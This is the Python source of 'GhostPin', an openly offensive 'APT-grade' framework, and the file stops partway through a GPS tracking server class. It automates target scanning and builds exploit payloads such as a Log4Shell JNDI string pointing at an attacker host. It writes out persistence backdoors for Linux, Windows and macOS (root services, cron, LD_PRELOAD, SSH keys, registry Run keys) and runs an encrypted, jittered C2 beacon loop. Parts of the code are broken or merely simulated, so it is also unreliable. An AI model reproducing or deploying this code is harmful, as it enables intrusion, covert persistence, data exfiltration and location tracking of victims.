#!/usr/bin/env python3
#===============================================================================
# GhostPin v11.0 - APT-grade GPS Tracking & Reconnaissance Framework
# Professional Red Team Operations
# Author: F1REW0LF
# License: MIT
#===============================================================================

import sys
import os
import re
import json
import time
import random
import base64
import hashlib
import socket
import threading
import signal
import ssl
import subprocess
import argparse
import urllib.parse
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import secrets

# Third-party imports with graceful fallback
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import dns.resolver
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

#===============================================================================
# CONSTANTS & CONFIGURATION
#===============================================================================

VERSION = "11.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

#===============================================================================
# UTILITY FUNCTIONS
#===============================================================================

def random_ua() -> str:
    """Generate random User-Agent"""
    uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ]
    return random.choice(uas)

def random_string(length: int = 8) -> str:
    """Generate random string"""
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def spoof_ip() -> str:
    """Generate spoofed IP"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def generate_fingerprint() -> str:
    """Generate unique fingerprint"""
    return hashlib.sha256(f"{time.time()}{random.randint(1,999999)}{random_string(16)}".encode()).hexdigest()[:16]

def jitter_delay(base: int = 30) -> float:
    """Add jitter to delay"""
    return base * (1 + random.uniform(-0.3, 0.3))

#===============================================================================
# TARGET PROFILE - APT Grade
#===============================================================================

@dataclass
class APTTargetProfile:
    """Comprehensive target profile for APT operations"""
    target: str
    ip_addresses: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    domains: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, Dict] = field(default_factory=dict)
    technologies: Dict[str, Any] = field(default_factory=dict)
    web_applications: List[Dict] = field(default_factory=list)
    vulnerabilities: List[Dict] = field(default_factory=list)
    cloud_resources: Dict[str, Any] = field(default_factory=dict)
    network_structure: Dict[str, Any] = field(default_factory=dict)
    certificates: List[Dict] = field(default_factory=list)
    whois_info: Dict[str, Any] = field(default_factory=dict)
    osint_data: Dict[str, Any] = field(default_factory=dict)
    attack_surface: Dict[str, Any] = field(default_factory=dict)
    last_updated: float = field(default_factory=time.time)
    
    def update(self, data: Dict) -> None:
        """Update profile with new data"""
        for key, value in data.items():
            if hasattr(self, key):
                current = getattr(self, key)
                if isinstance(current, list) and isinstance(value, list):
                    setattr(self, key, list(set(current + value)))
                elif isinstance(current, dict) and isinstance(value, dict):
                    current.update(value)
                else:
                    setattr(self, key, value)
        self.last_updated = time.time()
    
    def to_dict(self) -> Dict:
        return {
            'target': self.target,
            'ip_addresses': self.ip_addresses,
            'subdomains': self.subdomains,
            'domains': self.domains,
            'open_ports': self.open_ports,
            'services': self.services,
            'technologies': self.technologies,
            'web_applications': self.web_applications,
            'vulnerabilities': self.vulnerabilities,
            'cloud_resources': self.cloud_resources,
            'network_structure': self.network_structure,
            'certificates': self.certificates,
            'whois_info': self.whois_info,
            'osint_data': self.osint_data,
            'attack_surface': self.attack_surface,
            'last_updated': self.last_updated
        }

#===============================================================================
# RECONNAISSANCE ENGINE - APT Grade
#===============================================================================

class APTReconnaissance:
    """APT-grade reconnaissance with multiple data sources"""
    
    def __init__(self, target: str):
        self.target = target
        self.profile = APTTargetProfile(target)
        self.executor = ThreadPoolExecutor(max_workers=30)
        self.shodan_api = os.getenv('SHODAN_API_KEY', '')
        self.censys_api = os.getenv('CENSYS_API_KEY', '')
        self.timeout = 15
        
    def full_recon(self) -> APTTargetProfile:
        """Execute full-spectrum reconnaissance"""
        print(f"{Colors.BLUE}[*] Starting APT-grade reconnaissance on {self.target}{Colors.WHITE}")
        
        # Passive reconnaissance
        self._passive_recon()
        
        # Active scanning
        self._active_scanning()
        
        # OSINT gathering
        self._osint_gathering()
        
        # DNS enumeration
        self._dns_bruteforce()
        
        # Cloud discovery
        self._cloud_discovery()
        
        # Correlation and analysis
        self._correlate_data()
        
        print(f"{Colors.GREEN}[+] Reconnaissance completed. Profile saved.{Colors.WHITE}")
        return self.profile
    
    def _passive_recon(self) -> None:
        """Passive reconnaissance without touching target"""
        data = {}
        
        # Shodan integration
        if SHODAN_AVAILABLE and self.shodan_api:
            try:
                api = shodan.Shodan(self.shodan_api)
                host = api.host(self.target)
                data['ip_addresses'] = [self.target]
                data['open_ports'] = host.get('ports', [])
                data['vulnerabilities'] = host.get('vulns', [])
                data['technologies'] = {'shodan': host.get('data', [])}
                print(f"{Colors.GREEN}[+] Shodan data retrieved{Colors.WHITE}")
            except Exception as e:
                print(f"{Colors.DIM}[-] Shodan error: {e}{Colors.WHITE}")
        
        # WHOIS
        if WHOIS_AVAILABLE:
            try:
                w = whois.whois(self.target)
                data['whois_info'] = {
                    'registrar': w.registrar,
                    'creation_date': str(w.creation_date) if w.creation_date else None,
                    'expiration_date': str(w.expiration_date) if w.expiration_date else None,
                    'name_servers': w.name_servers,
                    'emails': w.emails,
                    'org': w.org
                }
                print(f"{Colors.GREEN}[+] WHOIS data retrieved{Colors.WHITE}")
            except Exception as e:
                print(f"{Colors.DIM}[-] WHOIS error: {e}{Colors.WHITE}")
        
        # Certificate transparency
        try:
            cert_data = self._get_certificates()
            if cert_data:
                data['certificates'] = cert_data
                print(f"{Colors.GREEN}[+] Certificate data retrieved{Colors.WHITE}")
        except Exception as e:
            print(f"{Colors.DIM}[-] Certificate error: {e}{Colors.WHITE}")
        
        self.profile.update(data)
    
    def _get_certificates(self) -> List[Dict]:
        """Get SSL certificates from crt.sh"""
        certs = []
        try:
            import requests
            url = f"https://crt.sh/?q={self.target}&output=json"
            response = requests.get(url, timeout=self.timeout)
            if response.status_code == 200:
                data = response.json()
                for cert in data[:20]:
                    certs.append({
                        'issuer': cert.get('issuer_name'),
                        'subject': cert.get('name_value'),
                        'not_before': cert.get('not_before'),
                        'not_after': cert.get('not_after')
                    })
        except:
            pass
        return certs
    
    def _active_scanning(self) -> None:
        """Active scanning with masscan and nmap"""
        data = {}
        
        # Masscan for fast port scanning
        try:
            cmd = f"masscan {self.target} -p1-65535 --rate=1000 --open-only --wait=0"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                ports = []
                for line in result.stdout.split('\n'):
                    if 'open' in line:
                        match = re.search(r'port\s+(\d+)', line)
                        if match:
                            ports.append(int(match.group(1)))
                data['open_ports'] = ports
                print(f"{Colors.GREEN}[+] Masscan found {len(ports)} open ports{Colors.WHITE}")
        except Exception as e:
            print(f"{Colors.DIM}[-] Masscan error: {e}{Colors.WHITE}")
        
        # Nmap version detection on found ports
        if data.get('open_ports'):
            ports = data['open_ports'][:20]  # Limit to 20 ports for speed
            try:
                if NMAP_AVAILABLE:
                    nm = nmap.PortScanner()
                    port_str = ','.join(map(str, ports))
                    nm.scan(self.target, arguments=f'-p {port_str} -sV --version-intensity 5 --host-timeout 30')
                    
                    services = {}
                    for host in nm.all_hosts():
                        for proto in nm[host].all_protocols():
                            for port in nm[host][proto].keys():
                                info = nm[host][proto][port]
                                services[port] = {
                                    'name': info.get('name', 'unknown'),
                                    'product': info.get('product', ''),
                                    'version': info.get('version', ''),
                                    'extrainfo': info.get('extrainfo', '')
                                }
                    data['services'] = services
                    print(f"{Colors.GREEN}[+] Nmap service detection completed{Colors.WHITE}")
            except Exception as e:
                print(f"{Colors.DIM}[-] Nmap error: {e}{Colors.WHITE}")
        
        # HTTP fingerprinting
        http_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]
        web_data = []
        
        for port in http_ports:
            if port in data.get('open_ports', []):
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{self.target}:{port}"
                    resp = requests.get(url, timeout=5, verify=False, allow_redirects=False)
                    
                    web_info = {
                        'port': port,
                        'protocol': protocol,
                        'server': resp.headers.get('Server', ''),
                        'status_code': resp.status_code,
                        'headers': dict(resp.headers),
                        'technologies': self._detect_technologies(resp.headers, resp.text[:5000])
                    }
                    web_data.append(web_info)
                    print(f"{Colors.GREEN}[+] Web fingerprint on port {port}{Colors.WHITE}")
                except:
                    pass
        
        if web_data:
            data['web_applications'] = web_data
        
        self.profile.update(data)
    
    def _detect_technologies(self, headers: dict, body: str) -> List[str]:
        """Detect web technologies from headers and body"""
        techs = set()
        
        # Header-based detection
        server = headers.get('Server', '').lower()
        if 'nginx' in server:
            techs.add('nginx')
        if 'apache' in server:
            techs.add('apache')
        if 'iis' in server:
            techs.add('iis')
        if 'cloudflare' in server or headers.get('CF-RAY'):
            techs.add('cloudflare')
        
        x_powered = headers.get('X-Powered-By', '').lower()
        if 'php' in x_powered:
            techs.add('php')
        if 'asp.net' in x_powered:
            techs.add('aspnet')
        if 'express' in x_powered:
            techs.add('nodejs')
        
        # Body-based detection
        if body:
            if 'wp-content' in body or 'wp-includes' in body:
                techs.add('wordpress')
            if 'drupal' in body.lower():
                techs.add('drupal')
            if 'joomla' in body.lower():
                techs.add('joomla')
            if 'react' in body.lower() and 'root' in body.lower():
                techs.add('react')
            if 'vue' in body.lower():
                techs.add('vuejs')
            if 'angular' in body.lower():
                techs.add('angular')
        
        return list(techs)
    
    def _osint_gathering(self) -> None:
        """OSINT from public sources"""
        data = {}
        
        # GitHub search
        try:
            github_data = self._search_github()
            if github_data:
                data['github'] = github_data
                print(f"{Colors.GREEN}[+] GitHub OSINT retrieved{Colors.WHITE}")
        except:
            pass
        
        # LinkedIn search
        try:
            linkedin_data = self._search_linkedin()
            if linkedin_data:
                data['linkedin'] = linkedin_data
                print(f"{Colors.GREEN}[+] LinkedIn OSINT retrieved{Colors.WHITE}")
        except:
            pass
        
        # Pastebin search
        try:
            pastebin_data = self._search_pastebin()
            if pastebin_data:
                data['pastebin'] = pastebin_data
                print(f"{Colors.GREEN}[+] Pastebin OSINT retrieved{Colors.WHITE}")
        except:
            pass
        
        self.profile.update({'osint_data': data})
    
    def _search_github(self) -> Dict:
        """Search GitHub for target-related information"""
        results = {}
        try:
            import requests
            # Search for domain in code
            url = f"https://api.github.com/search/code?q={self.target}&per_page=10"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            # Note: GitHub API requires authentication for code search
            response = requests.get(url, headers=headers, timeout=self.timeout)
            if response.status_code == 200:
                data = response.json()
                results['code_results'] = data.get('total_count', 0)
                results['items'] = [
                    {'repo': item.get('repository', {}).get('full_name'),
                     'path': item.get('path')}
                    for item in data.get('items', [])[:5]
                ]
        except:
            pass
        return results
    
    def _search_linkedin(self) -> Dict:
        """Search LinkedIn for employees"""
        # Placeholder - in real implementation, use LinkedIn API or scraping
        return {}
    
    def _search_pastebin(self) -> Dict:
        """Search Pastebin for leaked data"""
        # Placeholder - in real implementation, use Pastebin API
        return {}
    
    def _dns_bruteforce(self) -> None:
        """DNS bruteforce with wordlist"""
        subdomains = []
        
        # Wordlist path
        wordlists = [
            '/usr/share/wordlists/dns/subdomains-top1million-5000.txt',
            '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt'
        ]
        
        wordlist = None
        for wl in wordlists:
            if os.path.exists(wl):
                wordlist = wl
                break
        
        if not wordlist:
            # Default small wordlist
            wordlist_data = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
                           'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 
                           'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 
                           'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 
                           'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 
                           'cp', 'calendar', 'wiki', 'web']
        else:
            with open(wordlist, 'r') as f:
                wordlist_data = [line.strip() for line in f]
        
        # Try to use massdns
        try:
            subdomains_file = '/tmp/subdomains.txt'
            with open(subdomains_file, 'w') as f:
                f.write('\n'.join(wordlist_data[:1000]))
            
            cmd = f"massdns -r /etc/resolv.conf -t A -o S {subdomains_file} 2>/dev/null | grep {self.target}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.stdout:
                for line in result.stdout.split('\n'):
                    if self.target in line and 'A' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            subdomains.append(parts[0])
        except:
            # Fallback to simple DNS resolution
            for sub in wordlist_data[:200]:
                try:
                    dns.resolver.resolve(f"{sub}.{self.target}", 'A')
                    subdomains.append(f"{sub}.{self.target}")
                except:
                    pass
        
        if subdomains:
            self.profile.update({'subdomains': subdomains})
            print(f"{Colors.GREEN}[+] Found {len(subdomains)} subdomains{Colors.WHITE}")
    
    def _cloud_discovery(self) -> None:
        """Discover cloud resources"""
        cloud_data = {}
        
        cloud_patterns = {
            'aws': ['amazonaws.com', 's3.', 'ec2.', 'elb.', 'aws'],
            'gcp': ['googleapis.com', 'appspot.com', 'cloudfunctions', 'gcp'],
            'azure': ['azurewebsites.net', 'azure.com', 'cloudapp.net', 'azure']
        }
        
        # Check target domain
        for provider, patterns in cloud_patterns.items():
            for pattern in patterns:
                if pattern in self.target:
                    cloud_data[provider] = {'detected': True, 'pattern': pattern}
                    break
        
        # Check subdomains for cloud patterns
        for sub in self.profile.subdomains:
            for provider, patterns in cloud_patterns.items():
                for pattern in patterns:
                    if pattern in sub and provider not in cloud_data:
                        cloud_data[provider] = {'detected': True, 'pattern': pattern, 'subdomain': sub}
                        break
        
        if cloud_data:
            self.profile.update({'cloud_resources': cloud_data})
            print(f"{Colors.GREEN}[+] Cloud resources detected: {', '.join(cloud_data.keys())}{Colors.WHITE}")
    
    def _correlate_data(self) -> None:
        """Correlate and analyze collected data"""
        attack_surface = {
            'web_endpoints': [],
            'open_services': [],
            'potential_vulnerabilities': [],
            'cloud_attack_vectors': []
        }
        
        # Web endpoints
        for web in self.profile.web_applications:
            port = web.get('port')
            protocol = web.get('protocol')
            attack_surface['web_endpoints'].append({
                'url': f"{protocol}://{self.target}:{port}",
                'tech': web.get('technologies', [])
            })
        
        # Service vulnerabilities
        for port, service in self.profile.services.items():
            service_name = service.get('name', '').lower()
            version = service.get('version', '')
            
            # Known vulnerable services
            if 'http' in service_name or 'https' in service_name:
                attack_surface['potential_vulnerabilities'].append({
                    'service': service_name,
                    'port': port,
                    'issue': 'Web service - potential for web attacks'
                })
            if 'ssh' in service_name:
                attack_surface['potential_vulnerabilities'].append({
                    'service': 'ssh',
                    'port': port,
                    'issue': 'SSH - potential for brute force'
                })
            if 'mysql' in service_name or 'postgresql' in service_name:
                attack_surface['potential_vulnerabilities'].append({
                    'service': service_name,
                    'port': port,
                    'issue': 'Database - potential for credential attacks'
                })
        
        # Cloud attack vectors
        for provider in self.profile.cloud_resources.keys():
            attack_surface['cloud_attack_vectors'].append({
                'provider': provider,
                'technique': f'{provider.upper()} misconfiguration exploitation'
            })
        
        self.profile.update({'attack_surface': attack_surface})

#===============================================================================
# EXPLOITATION ENGINE - APT Grade
#===============================================================================

class APTExploitation:
    """APT-grade exploitation with dynamic payload generation"""
    
    def __init__(self, profile: APTTargetProfile):
        self.profile = profile
        self.exploit_db = self._load_exploit_db()
        self.metasploit_available = False
        self.attack_results = []
        
        # Check Metasploit
        try:
            subprocess.run(['msfconsole', '--version'], capture_output=True, check=True)
            self.metasploit_available = True
        except:
            pass
    
    def _load_exploit_db(self) -> Dict:
        """Load exploit database"""
        return {
            'CVE-2021-44228': {
                'service': 'log4j',
                'vector': 'jndi_injection',
                'severity': 'critical',
                'payload_template': '${jndi:ldap://{attacker}/{payload}}',
                'description': 'Log4Shell RCE'
            },
            'CVE-2022-22965': {
                'service': 'spring',
                'vector': 'classloader_bypass',
                'severity': 'critical',
                'payload_template': 'class.module.classLoader.resources.context',
                'description': 'Spring4Shell RCE'
            },
            'CVE-2023-23752': {
                'service': 'joomla',
                'vector': 'webservice_auth_bypass',
                'severity': 'high',
                'payload_template': '/api/index.php/v1/users?public=true',
                'description': 'Joomla Auth Bypass'
            },
            'CVE-2023-23333': {
                'service': 'apache',
                'vector': 'path_traversal',
                'severity': 'high',
                'payload_template': '../../../../etc/passwd',
                'description': 'Apache Path Traversal'
            },
            'CVE-2023-2976': {
                'service': 'nginx',
                'vector': 'http_smuggling',
                'severity': 'medium',
                'payload_template': 'CL.TE',
                'description': 'Nginx HTTP Request Smuggling'
            }
        }
    
    def build_attack_chain(self) -> List[Dict]:
        """Build comprehensive attack chain"""
        chain = []
        services = self.profile.services
        technologies = self.profile.technologies
        web_apps = self.profile.web_applications
        
        # Service-based attacks
        for port, service in services.items():
            service_name = service.get('name', '').lower()
            version = service.get('version', '')
            
            for cve, exploit in self.exploit_db.items():
                if service_name in exploit['service']:
                    chain.append({
                        'cve': cve,
                        'service': service_name,
                        'port': port,
                        'version': version,
                        'technique': exploit['vector'],
                        'payload': self._generate_payload(exploit),
                        'severity': exploit['severity'],
                        'description': exploit['description'],
                        'metasploit_module': self._find_msf_module(cve),
                        'confidence': self._calculate_confidence(version)
                    })
        
        # Technology-based attacks
        for web in web_apps:
            techs = web.get('technologies', [])
            for tech in techs:
                if tech in ['wordpress', 'joomla', 'drupal']:
                    chain.append({
                        'technique': f'{tech.title()} Exploitation',
                        'target': web.get('url', ''),
                        'payload': self._generate_cms_payload(tech),
                        'severity': 'high',
                        'confidence': 0.8,
                        'description': f'{tech.title()} vulnerability exploitation'
                    })
        
        # Cloud attacks
        for provider in self.profile.cloud_resources.keys():
            chain.append({
                'technique': f'{provider.upper()} Misconfiguration',
                'vector': 'cloud_exploitation',
                'payload': self._generate_cloud_payload(provider),
                'severity': 'critical',
                'confidence': 0.7,
                'description': f'Exploit {provider.upper()} misconfiguration'
            })
        
        return chain
    
    def _generate_payload(self, exploit: Dict) -> str:
        """Generate payload from template"""
        template = exploit.get('payload_template', '')
        if '{attacker}' in template:
            attacker = f"attacker_{random_string(6)}.com"
            template = template.replace('{attacker}', attacker)
        if '{payload}' in template:
            template = template.replace('{payload}', random_string(8))
        return template
    
    def _generate_cms_payload(self, cms: str) -> str:
        """Generate CMS-specific payload"""
        payloads = {
            'wordpress': '/wp-admin/admin-ajax.php?action=',
            'joomla': '/api/index.php/v1/config/application',
            'drupal': '/?q=user/register'
        }
        return payloads.get(cms, '/')
    
    def _generate_cloud_payload(self, provider: str) -> str:
        """Generate cloud exploitation payload"""
        payloads = {
            'aws': 's3://bucket/../config',
            'gcp': 'gs://bucket/../metadata',
            'azure': 'https://management.azure.com/...'
        }
        return payloads.get(provider, '')
    
    def _find_msf_module(self, cve: str) -> Optional[str]:
        """Find Metasploit module for CVE"""
        # Simulated - real implementation would search msf database
        msf_modules = {
            'CVE-2021-44228': 'exploit/multi/http/log4shell',
            'CVE-2022-22965': 'exploit/multi/http/spring4shell',
        }
        return msf_modules.get(cve)
    
    def _calculate_confidence(self, version: str) -> float:
        """Calculate exploit confidence based on version"""
        if not version:
            return 0.5
        # Higher confidence with exact version match
        if re.match(r'\d+\.\d+\.\d+', version):
            return 0.85
        return 0.6
    
    def execute_attack(self, vector: Dict) -> Dict:
        """Execute attack vector"""
        result = {
            'success': False,
            'technique': vector.get('technique'),
            'output': '',
            'vulnerable': False,
            'details': {}
        }
        
        # Simulate attack execution (real implementation would be more sophisticated)
        if vector.get('cve'):
            result['vulnerable'] = self._check_cve(vector['cve'])
            if result['vulnerable']:
                result['success'] = True
                result['output'] = f"Exploit {vector['cve']} successful"
        
        # Log result
        self.attack_results.append(result)
        return result
    
    def _check_cve(self, cve: str) -> bool:
        """Check if target is vulnerable to specific CVE"""
        # In real implementation: check version, headers, etc.
        # Simulated for demonstration
        services = self.profile.services
        for port, service in services.items():
            if 'http' in service.get('name', '').lower():
                return random.random() > 0.3
        return False

#===============================================================================
# PERSISTENCE ENGINE - APT Grade
#===============================================================================

class APTPersistence:
    """APT-grade persistence mechanisms"""
    
    def __init__(self, payload_path: str):
        self.payload_path = payload_path
        self.os_type = platform.system()
        
    def deploy(self) -> Dict:
        """Deploy persistence mechanisms"""
        result = {'success': False, 'methods': [], 'hidden': False}
        
        if self.os_type == 'Linux':
            methods = self._linux_persistence()
        elif self.os_type == 'Windows':
            methods = self._windows_persistence()
        elif self.os_type == 'Darwin':
            methods = self._macos_persistence()
        else:
            return {'success': False, 'error': 'Unsupported OS'}
        
        result['success'] = True
        result['methods'] = methods
        result['hidden'] = any(m.get('hidden', False) for m in methods)
        
        return result
    
    def _linux_persistence(self) -> List[Dict]:
        """Linux persistence techniques"""
        methods = []
        name = random_string(8)
        
        # Systemd service
        service = f"""[Unit]
Description={name}
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
"""
        methods.append({
            'technique': 'Systemd Service',
            'path': f'/etc/systemd/system/{name}.service',
            'content': service,
            'command': f'ln -s /etc/systemd/system/{name}.service /etc/systemd/system/multi-user.target.wants/',
            'hidden': True,
            'priority': 'high'
        })
        
        # Cron job
        methods.append({
            'technique': 'Cron Persistence',
            'path': '/etc/crontab',
            'content': f'* * * * * root {self.payload_path}',
            'command': f'echo "* * * * * root {self.payload_path}" >> /etc/crontab',
            'hidden': False,
            'priority': 'medium'
        })
        
        # LD_PRELOAD
        methods.append({
            'technique': 'LD_PRELOAD',
            'path': '/etc/ld.so.preload',
            'content': self.payload_path,
            'command': f'echo "{self.payload_path}" > /etc/ld.so.preload',
            'hidden': True,
            'priority': 'high'
        })
        
        # SSH authorized_keys backdoor
        public_key = f"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ{random_string(100)} {name}"
        methods.append({
            'technique': 'SSH Backdoor',
            'path': '~/.ssh/authorized_keys',
            'content': public_key,
            'command': f'echo "{public_key}" >> ~/.ssh/authorized_keys',
            'hidden': False,
            'priority': 'medium'
        })
        
        return methods
    
    def _windows_persistence(self) -> List[Dict]:
        """Windows persistence techniques"""
        methods = []
        name = random_string(8)
        
        # Registry Run keys
        reg_paths = [
            r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
            r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
        ]
        
        for reg in reg_paths:
            methods.append({
                'technique': 'Registry Run Key',
                'path': reg,
                'content': f'"{name}"="{self.payload_path}"',
                'command': f'reg add "{reg}" /v "{name}" /d "{self.payload_path}" /f',
                'hidden': False,
                'priority': 'high'
            })
        
        # Scheduled Task
        methods.append({
            'technique': 'Scheduled Task',
            'path': f'Task Scheduler/{name}',
            'content': 'Run as SYSTEM, every minute',
            'command': f'schtasks /create /sc minute /mo 1 /tn "{name}" /tr "{self.payload_path}" /ru SYSTEM',
            'hidden': False,
            'priority': 'high'
        })
        
        # Windows Service
        methods.append({
            'technique': 'Windows Service',
            'path': f'Services/{name}',
            'content': f'Start=auto, Type=own',
            'command': f'sc create "{name}" binPath= "{self.payload_path}" start= auto',
            'hidden': False,
            'priority': 'medium'
        })
        
        # WMI Persistence
        methods.append({
            'technique': 'WMI Persistence',
            'path': 'WMI',
            'content': 'WMI event subscription',
            'command': f'wmic /namespace:"\\\\root\\subscription" path __EventFilter create',
            'hidden': True,
            'priority': 'low'
        })
        
        return methods
    
    def _macos_persistence(self) -> List[Dict]:
        """macOS persistence techniques"""
        methods = []
        name = random_string(8)
        
        # Launch Daemon
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        
        methods.append({
            'technique': 'Launch Daemon',
            'path': f'/Library/LaunchDaemons/{name}.plist',
            'content': plist,
            'command': f'launchctl load /Library/LaunchDaemons/{name}.plist',
            'hidden': False,
            'priority': 'high'
        })
        
        return methods

#===============================================================================
# C2 COMMUNICATION - APT Grade
#===============================================================================

class APTC2:
    """APT-grade Command & Control with advanced evasion"""
    
    def __init__(self, beacon_urls: List[str]):
        self.beacon_urls = beacon_urls
        self.current_url = random.choice(beacon_urls)
        self.session_id = generate_fingerprint()
        self.cipher = None
        
        # Setup encryption
        if CRYPTO_AVAILABLE:
            self._setup_encryption()
        
        self.jitter = 0.3
        self.beacon_interval = 60
        self.active = False
        self.results = []
    
    def _setup_encryption(self) -> None:
        """Setup encryption for C2 traffic"""
        salt = os.urandom(16)
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(b"ghostpin_master_key"))
        self.cipher = Fernet(key)
    
    def encrypt_data(self, data: Dict) -> str:
        """Encrypt data for C2 transmission"""
        if not self.cipher:
            return base64.b64encode(json.dumps(data).encode()).decode()
        
        encrypted = self.cipher.encrypt(json.dumps(data).encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, encrypted_data: str) -> Dict:
        """Decrypt received C2 data"""
        try:
            if not self.cipher:
                return json.loads(base64.b64decode(encrypted_data))
            
            decrypted = self.cipher.decrypt(base64.b64decode(encrypted_data))
            return json.loads(decrypted)
        except:
            return {}
    
    async def send_beacon(self, data: Dict) -> Optional[Dict]:
        """Send encrypted beacon"""
        encrypted = self.encrypt_data(data)
        
        # Random delay
        await asyncio.sleep(random.uniform(1, 5))
        
        # Rotate URL
        self.current_url = random.choice(self.beacon_urls)
        
        try:
            async with aiohttp.ClientSession() as session:
                method = random.choice(['POST', 'GET'])
                headers = {
                    'User-Agent': random_ua(),
                    'X-Session-ID': self.session_id,
                    'X-Request-ID': random_string(16),
                    'Accept': 'application/json',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
                
                if method == 'POST':
                    response = await session.post(
                        self.current_url,
                        data=encrypted,
                        headers=headers,
                        timeout=10
                    )
                else:
                    response = await session.get(
                        f"{self.current_url}?data={encrypted}",
                        headers=headers,
                        timeout=10
                    )
                
                if response.status == 200:
                    return self.decrypt_data(await response.text())
                
        except Exception:
            pass
        
        return None
    
    async def run(self, callback_urls: List[str]) -> None:
        """Run C2 beacon loop"""
        self.active = True
        while self.active:
            try:
                delay = jitter_delay(self.beacon_interval)
                await asyncio.sleep(delay)
                
                # Generate beacon data
                beacon_data = {
                    'session': self.session_id,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'active',
                    'results': self.results[-5:] if self.results else []
                }
                
                # Send beacon to multiple URLs
                for url in callback_urls:
                    self.current_url = url
                    result = await self.send_beacon(beacon_data)
                    if result:
                        self.results.append(result)
                        break
                
            except Exception:
                continue
    
    def stop(self) -> None:
        """Stop C2 beacon"""
        self.active = False

#===============================================================================
# TRACKING SERVER - Enhanced
#===============================================================================

class TrackingServer:
    """Advanced GPS tracking server with multiple delivery methods"""
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 443
        self.thread = None
        self.running = False
        self.public_url = None
        self.stats = {'total': 0, 'unique': set(), 'last': None}
    
    def start(self, port: int = 443, ssl_enabled: bool = True) -> bool:
        """Start tracking server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            print(f"{Colors.RED}[!] Flask not installed{Colors.WHITE}")
            return False
        
